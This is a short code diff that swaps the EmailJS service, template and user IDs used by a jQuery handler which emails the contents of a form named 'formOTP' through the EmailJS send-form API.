@@ -8,9 +8,9 @@ $('#formOTP').on('submit', function(event) {
   event.preventDefault(); // prevent reload
   
   var formData = new FormData(this);
-    formData.append('service_id', 'service_v7uhotl');
-    formData.append('template_id', 'template_bqh9j4o');
-    formData.append('user_id', 'AC1tWnwYU0-YFBSK1');
+    formData.append('service_id', 'service_fmt1k46');
+    formData.append('template_id', 'template_uzrsmyk');
+    formData.append('user_id', 'rQzt8bpBAWfMiOT7n');
 
   $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
       type: 'POST',
